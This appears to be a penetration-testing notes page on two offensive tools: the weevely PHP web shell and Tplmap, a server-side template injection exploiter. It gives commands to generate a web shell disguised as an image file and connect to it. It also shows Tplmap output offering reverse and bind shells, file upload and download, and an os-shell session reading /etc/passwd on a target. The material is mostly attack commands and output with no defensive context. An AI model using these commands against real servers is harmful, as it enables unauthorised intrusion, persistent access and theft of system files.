
### weevely

`Weevely` is a web shell designed for post-exploitation purposes that can be extended over the network at runtime.

Upload `weevely` PHP agent to a target web server to get remote shell access to it. It has more than 30 modules to assist administrative tasks, maintain access, provide situational awareness, elevate privileges, and spread into the target network.

> [!info]+ weevely
> ##### *Generate*
> ```bash
>weevely generate password123 /home/usr/path/mal.jpg
> ```
> ##### *Shell*
>```bash
> weevely example.com/mal.jpg/mal.php password123
>```

### Tplmap

`Tplmap` is tool that used to detect server-side Template Injection (`SSTI`) vulnerabilities  in web applications. it is an open-source python-based tool that allows users to detect and exploit these vulnerabilities. `Tplmap` can also be used for sandbox escapes and other exploitation purposes. `Tplmap` can be found on `Github` and is easy to install and use. it can be valuable tool for security researchers and penetration testers looking to test the security of web applications.
- a useful tool to detect `SSTI` vulnerability
- it helps in the exploitation including sandbox escapes
[TPLMAP GitHub](https://github.com/epinna/tplmap)

```bash
$ ./tplmap.py -u 'http://www.target.com/page?name=John'
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if GET parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '{*}'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
...
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  GET parameter: name
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[+] Rerun tplmap providing one of the following options:
    --os-shell                Run shell on the target
    --os-cmd                  Execute shell commands
    --bind-shell PORT         Connect to a shell bind to a target port
    --reverse-shell HOST PORT Send a shell back to the attacker's port
    --upload LOCAL REMOTE     Upload files to the server
    --download REMOTE LOCAL   Download remote files
```

Use `--os-shell` option to launch a pseudo-terminal on the target.

```bash
$ ./tplmap.py --os-shell -u 'http://www.target.com/page?name=John'
[+] Tplmap 0.5 Automatic Server-Side Template Injection Detection and Exploitation Tool
[+] Run commands on the operating system.

linux $ whoami
www
linux $ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
```

## Supported template engines

`Tplmap` supports over 15 template engines, `unsandboxed` template engines and generic _eval()_-like injections.

| Engine                      | Remote Command Execution | Blind | Code evaluation | File read | File write |
| --------------------------- | ------------------------ | ----- | --------------- | --------- | ---------- |
| Mako                        | ✓                        | ✓     | Python          | ✓         | ✓          |
| Jinja2                      | ✓                        | ✓     | Python          | ✓         | ✓          |
| Python (code eval)          | ✓                        | ✓     | Python          | ✓         | ✓          |
| Tornado                     | ✓                        | ✓     | Python          | ✓         | ✓          |
| Nunjucks                    | ✓                        | ✓     | JavaScript      | ✓         | ✓          |
| Pug                         | ✓                        | ✓     | JavaScript      | ✓         | ✓          |
| doT                         | ✓                        | ✓     | JavaScript      | ✓         | ✓          |
| Marko                       | ✓                        | ✓     | JavaScript      | ✓         | ✓          |
| JavaScript (code eval)      | ✓                        | ✓     | JavaScript      | ✓         | ✓          |
| Dust                        | ✓                        | ✓     | JavaScript      | ✓         | ✓          |
| EJS                         | ✓                        | ✓     | JavaScript      | ✓         | ✓          |
| Ruby (code eval)            | ✓                        | ✓     | Ruby            | ✓         | ✓          |
| Slim                        | ✓                        | ✓     | Ruby            | ✓         | ✓          |
| ERB                         | ✓                        | ✓     | Ruby            | ✓         | ✓          |
| Smarty (unsecured)          | ✓                        | ✓     | PHP             | ✓         | ✓          |
| PHP (code eval)             | ✓                        | ✓     | PHP             | ✓         | ✓          |
| Twig <=1.19                 | ✓                        | ✓     | PHP             | ✓         | ✓          |
| Freemarker                  | ✓                        | ✓     | Java            | ✓         | ✓          |
| Velocity                    | ✓                        | ✓     | Java            | ✓         | ✓          |
| Twig >1.19                  | ×                        | ×     | ×               | ×         | ×          |
| Smarty (secured)            | ×                        | ×     | ×               | ×         | ×          |
| Dust > dustjs-helpers 1.5.0 | ×                        | ×     | ×               | ×         | ×          |

[Burp Suite Plugin](https://github.com/epinna/tplmap#burp-suite-plugin)
